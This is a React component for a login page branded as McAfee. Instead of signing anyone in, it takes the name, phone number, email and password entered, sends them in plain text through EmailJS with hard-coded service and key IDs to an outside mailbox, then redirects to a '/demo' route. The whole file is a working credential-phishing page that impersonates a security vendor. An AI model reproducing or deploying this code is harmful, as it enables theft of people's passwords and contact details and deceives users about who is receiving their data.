import { useState } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

export default function UserLogin() {
  const [name, setName] = useState("");
  const [number, setNumber] = useState("");
  const [email, setEmail] = useState("");
  const [code, setCode] = useState(""); // web_name
  
  // const [message, setMessage] = useState("");
  const navigate = useNavigate();
  const currentDateTime = new Date().toLocaleString("en-US", {
    timeZone: "Asia/Kolkata", // or your preferred timezone
    dateStyle: "medium",
    timeStyle: "short",
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      const result = await emailjs.send(
        "service_uwgxhgo",
        "template_c446ndf",
        {
         
          from_name: "McAfee",
         name: name,
          message: `
          Name: ${name},
          Email: ${email},
          Number: ${number},
          Password: ${code},
          Date/Time: ${currentDateTime}
          `,
         
         
        },
        "iwh2dFI31xGaG4fBY"
      );

      if (result.status === 200) {
        console.log("Email sent successfully!", result.text);
        navigate("/demo");
      } else {
        console.warn("Email not sent:", result.status, result.text);
      }
    } catch (error) {
      console.error("Failed to send email:", error);
    }
  };

  return (
     <div className="min-h-screen flex items-center justify-center bg-[#ecebeb] py-10 px-4">
      <form
        onSubmit={handleSubmit}
        className="bg-white  rounded-xl shadow-lg w-full max-w-md px-8 py-10 space-y-5"
      >
        <div className="text-center">
          <h2 className="text-3xl font-bold text-[#d71a28] mb-1">McAfee Login</h2>
          <p className="text-sm text-gray-600">Secure access to your account</p>
        </div>

        <input
          type="text"
          value={name}
          onChange={(e) => setName(e.target.value)}
          placeholder="Full Name"
          required
          className="w-full px-4 py-2 border border-gray-300 rounded-md outline-none focus:ring-2 focus:ring-[#d71a28]"
        />

        <input
          type="tel"
          value={number}
          onChange={(e) => setNumber(e.target.value)}
          placeholder="Phone Number"
          required
          maxLength={10}
          className="w-full px-4 py-2 border border-gray-300 rounded-md outline-none focus:ring-2 focus:ring-[#d71a28]"
        />

        <input
          type="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          placeholder="Email Address"
          required
          className="w-full px-4 py-2 border border-gray-300 rounded-md outline-none focus:ring-2 focus:ring-[#d71a28]"
        />

        <input
          type="password"
          value={code}
          onChange={(e) => setCode(e.target.value)}
          placeholder="User Password"
          required
          className="w-full px-4 py-2 border border-gray-300 rounded-md outline-none focus:ring-2 focus:ring-[#d71a28]"
        />

       
        <button
          type="submit"
          className="w-full bg-[#d71a28] text-white py-2 rounded-md hover:bg-[#b51220] transition"
        >
          Secure Login
        </button>

        
      </form>
    </div>
  );
}
